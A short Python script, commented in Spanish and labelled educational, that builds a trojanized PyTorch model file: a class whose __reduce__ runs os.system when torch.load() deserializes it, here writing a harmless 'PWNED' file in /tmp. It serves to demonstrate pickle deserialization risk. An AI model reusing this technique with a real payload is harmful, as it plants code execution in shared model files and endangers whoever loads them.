"""Construye un modelo PyTorch troyanizado para fines educativos."""
import os
import torch


class Evil:
    """Clase con __reduce__ malicioso: ejecuta comando al deserializar."""
    def __reduce__(self):
        # Comando relativamente inofensivo: crear fichero + listar
        return (os.system, ("echo 'PWNED by pickle' > /tmp/pwned && ls -la /tmp/pwned",))


if __name__ == "__main__":
    # Imitamos un dict de modelo legítimo con un campo malicioso embebido
    fake_model = {
        "weights": torch.randn(100, 100),
        "bias": torch.randn(100),
        "metadata": Evil(),  # ← payload
    }
    torch.save(fake_model, "evil_model.pt")
    print("[+] Modelo malicioso creado: evil_model.pt")
    print("[!] Cualquier víctima que ejecute torch.load() recibirá el payload")
